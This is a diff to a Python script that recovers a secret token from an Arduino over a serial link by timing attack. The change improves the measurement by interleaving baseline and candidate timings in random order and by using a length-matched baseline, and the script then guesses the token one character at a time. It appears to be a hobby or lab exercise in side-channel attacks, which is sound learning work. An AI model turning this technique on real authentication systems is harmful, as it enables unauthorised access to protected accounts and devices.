@@ -2,10 +2,10 @@ import time
 import string
 import statistics
 import serial 
+import random
 from operator import itemgetter
 
 TOKEN_SIZE = 13
-PURE_LENGTH_STRING = "a" * TOKEN_SIZE
 
 arduino = serial.Serial(port='/dev/cu.usbserial-110', baudrate=115200, timeout=1)
 
@@ -15,10 +15,10 @@ def test(characters):
         res = arduino.readline().decode()
 
     time.sleep(0.0002)
-    arduino.flush()
     arduino.reset_input_buffer()
 
     arduino.write(bytes(characters+"\r\n", "utf-8"))
+    arduino.flush()
     before = time.perf_counter_ns()
 
     arduino.read(1)
@@ -27,20 +27,26 @@ def test(characters):
 
     return after - before
 
-def try_to_hack(characters):
-    timings = []
-
-    for i in range(50):
-        timings.append(test(characters) - test(PURE_LENGTH_STRING))
-
-    return timings
+def try_to_hack(characters, test_by_length): 
+    deltas = []
+    for _ in range(50):
+        if random.random() < 0.5:
+            b = test(test_by_length)
+            c = test(characters)
+        else:
+            c = test(characters)
+            b = test(test_by_length)
+        deltas.append(c - b)
+    return deltas
 
 def find_next_character(base):
     measures = []
 
+    test_by_length = base + "x" * (TOKEN_SIZE - len(base))
+
     print("Trying to find the character at position %s with prefix %r" % ((len(base) + 1), base))
     for i, character in enumerate(string.ascii_lowercase):
-        timings = try_to_hack(base + character + "a" * (TOKEN_SIZE - len(base) - 1))
+        timings = try_to_hack(base + character + "a" * (TOKEN_SIZE - len(base) - 1), test_by_length)
 
         median = statistics.median(timings)
         min_timing = min(timings)
